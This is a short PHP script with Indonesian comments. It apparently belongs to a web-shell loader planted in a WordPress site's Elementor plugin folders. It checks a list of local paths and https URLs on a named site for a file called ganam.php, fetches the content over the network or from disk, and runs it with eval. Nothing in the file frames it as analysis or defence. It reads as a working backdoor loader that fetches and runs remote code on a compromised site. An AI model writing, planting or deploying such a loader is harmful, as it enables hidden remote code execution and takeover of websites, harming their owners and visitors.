<?php
// Daftar path ke file ganam.txt
$paths = [
    '/home/gameceng/public_html/wp-content/plugins/elementor/data/base/ganam.php',
    '/home/gameceng/public_html/wp-content/plugins/elementor/data/base/processor/ganam.php',
    '/home/gameceng/public_html/wp-content/plugins/elementor/ganam.php',
    'https://gamecengli.id/wp-content/plugins/elementor/data/base/ganam.php',
    'https://gamecengli.id/wp-content/plugins/elementor/data/base/processor/ganam.php',
    'https://gamecengli.id/wp-content/plugins/elementor/ganam.php'
];

// Variabel untuk menyimpan status
$fileFound = false;

// Periksa setiap path
foreach ($paths as $path) {
    if (strpos($path, 'http') === 0) {
        // Jika path adalah URL, periksa dengan get_headers
        $headers = @get_headers($path);
        if ($headers && strpos($headers[0], '200') !== false) {
            // Jika file ditemukan, baca dan eksekusi konten
            // Menggunakan file_get_contents untuk mendapatkan konten
            $content = file_get_contents($path);
            // Mengeksekusi konten sebagai PHP
            eval('?>' . $content);
            exit();
        }
    } else {
        // Jika path adalah file lokal, periksa dengan file_exists
        if (file_exists($path)) {
            // Jika file ditemukan, baca dan eksekusi konten
            $content = file_get_contents($path);
            // Mengeksekusi konten sebagai PHP
            eval('?>' . $content);
            exit();
        }
    }
}

// Jika tidak ada file yang ditemukan, tampilkan pesan error
echo "File ganam.php tidak ditemukan di lokasi yang ditentukan.";
?>
